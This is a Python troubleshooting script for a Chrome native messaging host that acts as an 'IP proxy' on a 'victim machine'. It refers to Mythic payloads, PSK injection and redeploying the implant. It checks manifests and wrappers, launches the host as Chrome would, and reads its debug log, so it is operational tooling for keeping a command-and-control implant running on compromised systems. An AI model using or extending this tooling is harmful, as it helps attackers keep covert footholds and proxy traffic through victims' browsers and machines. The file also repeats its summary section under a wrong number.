#!/usr/bin/env python3
"""
check_install.py — diagnose the IP proxy native messaging installation

Run on the victim machine to verify the manifest, wrapper, Python host,
and debug log are all consistent and working.

Usage:
    python3 check_install.py
"""

import glob
import json
import os
import platform
import subprocess
import sys
import time

BOLD  = "\033[1m"
RED   = "\033[31m"
GRN   = "\033[32m"
YLW   = "\033[33m"
RESET = "\033[0m"

def ok(msg):   print(f"  {GRN}[OK]{RESET}  {msg}")
def fail(msg): print(f"  {RED}[!!]{RESET}  {BOLD}{msg}{RESET}")
def warn(msg): print(f"  {YLW}[??]{RESET}  {msg}")
def info(msg): print(f"  {BOLD}[  ]{RESET}  {msg}")

def section(title):
    print(f"\n{BOLD}{'─'*55}{RESET}")
    print(f"{BOLD}  {title}{RESET}")
    print(f"{BOLD}{'─'*55}{RESET}")


# ── 1. Find manifests ─────────────────────────────────────────────────────────

section("1 — Chrome native messaging manifests")

if platform.system() == "Darwin":
    manifest_dir = os.path.expanduser(
        "~/Library/Application Support/Google/Chrome/NativeMessagingHosts")
else:
    manifest_dir = os.path.expanduser(
        "~/.config/google-chrome/NativeMessagingHosts")

info(f"Manifest directory: {manifest_dir}")

if not os.path.isdir(manifest_dir):
    fail(f"Manifest directory does not exist — install.py was never run")
    sys.exit(1)

manifests = glob.glob(os.path.join(manifest_dir, "*.json"))
if not manifests:
    fail("No manifests found — run install.py first")
    sys.exit(1)

ok(f"Found {len(manifests)} manifest(s)")
for m in manifests:
    info(f"  {m}")


# ── 2. Parse each manifest ────────────────────────────────────────────────────

section("2 — Manifest contents")

for manifest_path in manifests:
    print(f"\n  {BOLD}{manifest_path}{RESET}")
    try:
        with open(manifest_path) as f:
            data = json.load(f)
    except Exception as e:
        fail(f"Cannot parse manifest: {e}")
        continue

    host_name    = data.get("name",            "MISSING")
    exec_path    = data.get("path",            "MISSING")
    host_type    = data.get("type",            "MISSING")
    origins      = data.get("allowed_origins", [])

    info(f"  name:    {host_name}")
    info(f"  path:    {exec_path}")
    info(f"  type:    {host_type}")
    info(f"  origins: {origins}")

    if host_type != "stdio":
        fail(f"type must be 'stdio', got '{host_type}'")
    else:
        ok("type is 'stdio'")

    if not origins:
        fail("allowed_origins is empty — Chrome will reject all extension connections")
    elif any("00000000000000000000000000000000" in o for o in origins):
        warn("allowed_origins has placeholder extension ID — re-run install.py with real ID")
    else:
        ok(f"allowed_origins has {len(origins)} origin(s)")


# ── 3. Check the executable path ─────────────────────────────────────────────

section("3 — Executable path check")

for manifest_path in manifests:
    try:
        with open(manifest_path) as f:
            data = json.load(f)
    except Exception:
        continue

    exec_path = data.get("path", "")
    print(f"\n  Checking: {exec_path}")

    if not exec_path:
        fail("path is empty in manifest")
        continue

    if not os.path.exists(exec_path):
        fail(f"FILE NOT FOUND: {exec_path}")
        fail("Chrome will report 'Native host has exited' — re-run install.py")
        continue

    ok(f"File exists")

    perms = oct(os.stat(exec_path).st_mode)[-3:]
    if os.access(exec_path, os.X_OK):
        ok(f"File is executable (perms: {perms})")
    else:
        fail(f"File is NOT executable (perms: {perms}) — run: chmod +x {exec_path}")

    # Show first two lines
    try:
        with open(exec_path) as f:
            lines = [f.readline().rstrip(), f.readline().rstrip()]
        info(f"  Line 1: {lines[0]}")
        info(f"  Line 2: {lines[1]}")
    except Exception as e:
        warn(f"Could not read file: {e}")

    # Detect type
    is_sh = exec_path.endswith(".sh") or exec_path.endswith(".bash")
    is_py = exec_path.endswith(".py")
    is_bat = exec_path.endswith(".bat")

    if is_sh:
        ok("Wrapper type: shell script (.sh)")
        # Extract python path and host script from wrapper
        try:
            with open(exec_path) as f:
                content = f.read()
            # look for exec "..." "..."
            import re
            m = re.search(r'exec\s+"([^"]+)"\s+"([^"]+)"', content)
            if m:
                py_path    = m.group(1)
                script_path = m.group(2)
                info(f"  Python  : {py_path}")
                info(f"  Script  : {script_path}")

                if not os.path.exists(py_path):
                    fail(f"Python binary not found: {py_path}")
                    fail("Re-run install.py — it will detect the correct Python path")
                else:
                    ok(f"Python binary exists: {py_path}")
                    ver = subprocess.run([py_path, "--version"],
                                        capture_output=True, text=True).stdout.strip() or \
                          subprocess.run([py_path, "--version"],
                                        capture_output=True, text=True).stderr.strip()
                    ok(f"Python version: {ver}")

                if not os.path.exists(script_path):
                    fail(f"Host script not found: {script_path}")
                    fail("Deploy the Python host file from the Mythic payload zip")
                else:
                    ok(f"Host script exists: {script_path}")
            else:
                warn("Could not parse exec line from wrapper — showing content:")
                for line in content.splitlines()[:5]:
                    info(f"  {line}")
        except Exception as e:
            warn(f"Could not analyse wrapper: {e}")

    elif is_py:
        ok("Manifest points directly to Python file")
        try:
            with open(exec_path) as f:
                shebang = f.readline().rstrip()
            info(f"  Shebang: {shebang}")
            interp = shebang.lstrip("#!").strip()
            if interp == "/usr/bin/env python3":
                warn("Shebang uses env — Chrome's PATH may not find python3")
                warn("Re-run install.py to create a wrapper with the absolute path")
            elif os.path.exists(interp.split()[0]):
                ok(f"Interpreter exists: {interp}")
            else:
                fail(f"Interpreter not found: {interp}")
        except Exception as e:
            warn(f"Could not read shebang: {e}")

    elif is_bat:
        ok("Wrapper type: .bat (Windows)")


# ── 4. Simulate Chrome launch ─────────────────────────────────────────────────

section("4 — Simulate Chrome launch")

print()
info("Running the manifest executable exactly as Chrome would...")
info("(passing a fake extension origin as argv[1])")
print()

for manifest_path in manifests:
    try:
        with open(manifest_path) as f:
            data = json.load(f)
    except Exception:
        continue

    exec_path = data.get("path", "")
    if not exec_path or not os.path.exists(exec_path):
        fail(f"Skipping — path not found: {exec_path}")
        continue

    debug_log = "/tmp/native_host_debug.log"
    # Remove old log so we can see if a fresh one is created
    try:
        os.unlink(debug_log)
    except FileNotFoundError:
        pass

    try:
        proc = subprocess.Popen(
            [exec_path, "chrome-extension://bigaehmghlefhmjgejejedjojjgdendj/"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except Exception as e:
        fail(f"Failed to launch: {e}")
        continue

    # Give it 2 seconds to start and write its debug log
    time.sleep(2)

    running = proc.poll() is None
    if running:
        ok("Process is still running after 2s — native host works in simulation!")
        ok("This means the wrapper and Python are both fine.")
        warn("Chrome-specific issue: Chrome may be killing it via SIGTERM or")
        warn("the deployed Python file is an old version without debug logging.")
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    else:
        rc = proc.returncode
        fail(f"Process exited with code {rc} — Chrome would see 'Native host has exited'")
        stderr_out = proc.stderr.read().decode(errors="replace").strip()
        stdout_out = proc.stdout.read().decode(errors="replace").strip()
        if stderr_out:
            fail(f"stderr: {stderr_out}")
        if stdout_out:
            info(f"stdout (raw): {stdout_out[:200]!r}")

    # Check debug log
    if os.path.exists(debug_log):
        ok(f"Debug log created: {debug_log}")
        with open(debug_log) as f:
            lines = f.readlines()
        for line in lines:
            info(f"  {line.rstrip()}")
    else:
        warn("No debug log created by simulation.")
        if running:
            warn("Python started but hasn't written the log yet (needs the activate msg)")
            warn("OR the deployed file is an old version — check with:")
            warn(f"  grep -c '_log\\|SIGTERM\\|debug' {exec_path.replace('_wrapper.sh', '.py') if exec_path.endswith('.sh') else exec_path}")
        else:
            fail("Wrapper exited AND no debug log — wrapper failing before Python starts")


# ── 5. Check deployed Python file version ─────────────────────────────────────

section("5 — Verify deployed Python file has debug logging")

for manifest_path in manifests:
    try:
        with open(manifest_path) as f:
            data = json.load(f)
    except Exception:
        continue

    exec_path = data.get("path", "")
    if not exec_path:
        continue

    # Find the Python script (either the exec_path itself, or derived from wrapper)
    candidates = [exec_path]
    if exec_path.endswith("_wrapper.sh"):
        candidates.append(exec_path.replace("_wrapper.sh", ".py"))
    elif exec_path.endswith(".sh"):
        base = exec_path[:-3]
        candidates.append(base + ".py")

    for py_path in candidates:
        if not py_path.endswith(".py") or not os.path.exists(py_path):
            continue
        print(f"\n  Python file: {py_path}")
        try:
            with open(py_path) as f:
                content = f.read()
            has_debug  = "_log(" in content
            has_sigterm = "SIGTERM" in content
            has_psk_set = '_PSK' in content and '!!PSK!!' not in content
            has_old_psk = '!!PSK!!' in content

            if has_debug:
                ok("File contains debug logging (_log)")
            else:
                fail("File does NOT contain debug logging — old version deployed")
                fail("Rebuild payload and redeploy the Python file from the zip")

            if has_sigterm:
                ok("File contains SIGTERM handling")
            else:
                warn("File does not contain SIGTERM handling — may exit on Chrome SIGTERM")

            if has_old_psk:
                fail("PSK sentinel '!!PSK!!' is still in the file — PSK was never injected")
                fail("Rebuild the payload in Mythic to inject the PSK")
            elif has_psk_set:
                ok("PSK appears to be injected (no sentinel)")

            # Show first 5 lines for identification
            lines = content.splitlines()[:5]
            info("First 5 lines of deployed file:")
            for line in lines:
                info(f"  {line}")

        except Exception as e:
            warn(f"Could not read {py_path}: {e}")


# ── 6. Summary ────────────────────────────────────────────────────────────────

section("6 — Summary")

print()
print("  Simulation running + debug log appears:")
print("  → Everything works in simulation. Chrome-specific issue.")
print("  → Try ip_proxy_start and check: cat /tmp/native_host_debug.log")
print()
print("  Simulation running + no debug log + file has debug code:")
print("  → Python starts but Chrome kills it before _run() via fast SIGTERM")
print("  → The SIGTERM fix must be in the deployed file (check section 5)")
print()
print("  Simulation running + no debug log + file MISSING debug code:")
print("  → Old version of Python file deployed — rebuild payload and redeploy")
print()
print("  Simulation exits + no debug log:")
print("  → Wrapper failing before Python — re-run install.py")
print()


# ── 5. Summary ────────────────────────────────────────────────────────────────

section("5 — Summary")

print()
print("  If section 4 shows the process exiting and no debug log:")
print("  → The wrapper script is failing before Python starts")
print("  → Re-run install.py to regenerate the wrapper with correct paths")
print()
print("  If section 4 shows the process running:")
print("  → Native host is working — issue is service worker / PSK / network")
print()
print("  If debug log exists but host exits:")
print("  → Check the log for the exit reason (SIGTERM, EOF, etc.)")
print()
